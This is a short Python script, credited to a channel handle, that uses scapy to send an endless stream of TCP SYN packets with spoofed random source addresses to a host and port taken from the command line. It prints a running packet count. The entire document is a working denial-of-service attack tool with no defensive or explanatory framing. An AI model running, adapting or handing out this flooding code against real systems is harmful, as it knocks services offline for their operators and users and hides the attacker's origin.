#! /usr/bin/env python3
# Channel RemaxBoxTeam
# lhashashinl <--M-->
from scapy.all import *
from scapy import *
import socket,sys


def SynFlooding(Target,port,message):
    ipm = RandIP()
    ip = IP(src=RandIP(),dst=f"{Target}",id=1111,ttl=99)
    tcp = TCP(sport=RandShort(),dport=int(port),seq=12345,ack=1000,window=1000,flags="S")
    pyload = ip/tcp/f"{message}"
    print("\033[92;3m Start Attack ...")
    i=0
    while True:  
        send(pyload,verbose=0)
        i+=1
        print(f"\033[41m PACKET \033[0m send Syn Flooding \033[31m{Target}\033[0m count \033[31m{i}\033[0m")




SynFlooding(Target=sys.argv[1],port=sys.argv[2],message=sys.argv[3])